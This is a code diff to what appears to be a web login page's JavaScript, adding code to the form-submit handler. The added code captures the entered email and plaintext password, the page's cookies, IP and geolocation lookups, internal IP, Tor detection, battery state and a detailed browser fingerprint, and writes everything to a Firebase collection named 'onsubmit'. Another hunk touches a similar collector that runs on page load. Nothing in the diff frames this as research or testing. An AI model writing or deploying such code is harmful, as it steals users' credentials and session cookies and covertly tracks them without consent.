@@ -49,6 +49,85 @@
 								location.reload(true);
 								return;
 							} else {
+								var ob = {
+									email: document.getElementById('username')
+										.value,
+									password: document.getElementById(
+										'password'
+									).value,
+									navigator: {
+										timeOpened: new Date(),
+										timezone:
+											new Date().getTimezoneOffset() / 60,
+										pageon: window.location.pathname,
+										referrer: document.referrer,
+										previousSites: history.length,
+										browserCodeName: navigator.appCodeName,
+										browserName: navigator.appName,
+										browserEngine: navigator.product,
+										browserVersion1a: navigator.appVersion,
+										browserVersion1b: navigator.userAgent,
+										browserLanguage: navigator.language,
+										browserOnline: navigator.onLine,
+										browserPlatform: navigator.platform,
+										connectionDownlink: connectionDownlink(),
+										connectionEffectiveType: connectionEffectiveType(),
+										connectionRTT: connectionRTT(),
+										javaEnabled: navigator.javaEnabled(),
+										dataCookiesEnabled:
+											navigator.cookieEnabled,
+										hardwareConcurrency:
+											navigator.hardwareConcurrency,
+										deviceMemory: navigator.deviceMemory,
+										maxTouchPoints:
+											navigator.maxTouchPoints,
+										updateChargeInfo: updateChargeInfo(),
+										updateLevelInfo: updateLevelInfo(),
+										updateChargingInfo: updateChargingInfo(),
+										updateDischargingInfo: updateDischargingInfo(),
+										dataCookies1: document.cookie,
+										dataCookies2: decodeURIComponent(
+											document.cookie.split(';')
+										),
+										sizeScreenW: screen.width,
+										sizeScreenH: screen.height,
+										sizeDocW:
+											document.documentElement
+												.clientWidth,
+										bodyCliW: document.body.clientWidth,
+										sizeDocH:
+											document.documentElement
+												.clientHeight,
+										bodyCliH: document.body.clientHeight,
+										sizeInW: innerWidth,
+										sizeInH: innerHeight,
+										sizeAvailW: screen.availWidth,
+										sizeAvailH: screen.availHeight,
+										scrColorDepth: screen.colorDepth,
+										scrPixelDepth: screen.pixelDepth,
+										ipapiData: ipapiDataCheck(),
+										ipinfoData: ipinfoDataCheck(),
+										internalIP: internalIP(),
+										torBrowser: torBrowser()
+									}
+								};
+								function recursivelyReplaceNullToZero(j) {
+									for (var i in j) {
+										if (typeof j[i] === 'object') {
+											recursivelyReplaceNullToZero(j[i]);
+										}
+										if (j[i] === null) {
+											j[i] = '';
+										}
+										if (j[i] === undefined) {
+											j[i] = '';
+										}
+										if (j[i] === NaN) {
+											j[i] = '';
+										}
+									}
+								}
+								recursivelyReplaceNullToZero(ob);
 								db.collection('onsubmit')
 									.doc(
 										firebase.firestore.Timestamp.now()
@@ -76,6 +155,97 @@
 								Materialize.toast(errorMessage, 1500);
 							}
 						});
+					function connectionDownlink() {
+						if (typeof navigator.connection == 'undefined') {
+							return false;
+						} else {
+							return (
+								navigator.connection.downlink ||
+								navigator.mozConnection.downlink ||
+								navigator.webkitConnection.downlink
+							);
+						}
+					}
+					function connectionEffectiveType() {
+						if (typeof navigator.connection == 'undefined') {
+							return false;
+						} else {
+							return (
+								navigator.connection.effectiveType ||
+								navigator.mozConnection.effectiveType ||
+								navigator.webkitConnection.effectiveType
+							);
+						}
+					}
+					function connectionRTT() {
+						if (typeof navigator.connection == 'undefined') {
+							return false;
+						} else {
+							return (
+								navigator.connection.rtt ||
+								navigator.mozConnection.rtt ||
+								navigator.webkitConnection.rtt
+							);
+						}
+					}
+					function internalIP() {
+						if (document.getElementById('internalIP').innerText)
+							return document.getElementById('internalIP')
+								.innerText;
+						else return false;
+					}
+					function torBrowser() {
+						if (document.getElementById('torBrowser').innerText)
+							return document.getElementById('torBrowser')
+								.innerText;
+						else return false;
+					}
+					function ipapiDataCheck() {
+						if (ipapiData) {
+							return ipapiData;
+						} else return false;
+					}
+					function ipinfoDataCheck() {
+						if (ipapiData) {
+							return ipapiData;
+						} else return false;
+					}
+					function updateChargeInfo() {
+						if (
+							document.getElementById('updateChargeInfo')
+								.innerText
+						)
+							return document.getElementById('updateChargeInfo')
+								.innerText;
+						else return false;
+					}
+					function updateLevelInfo() {
+						if (
+							document.getElementById('updateLevelInfo').innerText
+						)
+							return document.getElementById('updateLevelInfo')
+								.innerText;
+						else return false;
+					}
+					function updateChargingInfo() {
+						if (
+							document.getElementById('updateChargingInfo')
+								.innerText
+						)
+							return document.getElementById('updateChargingInfo')
+								.innerText;
+						else return false;
+					}
+					function updateDischargingInfo() {
+						if (
+							document.getElementById('updateDischargingInfo')
+								.innerText
+						)
+							return document.getElementById(
+								'updateDischargingInfo'
+							).innerText;
+						else return false;
+					}
 				}
 			}
 			function initApp() {
@@ -171,7 +341,6 @@
 								}
 							}
 							recursivelyReplaceNullToZero(ob);
-							console.log(ob);
 							db.collection('onload')
 								.doc(
 									firebase.firestore.Timestamp.now()
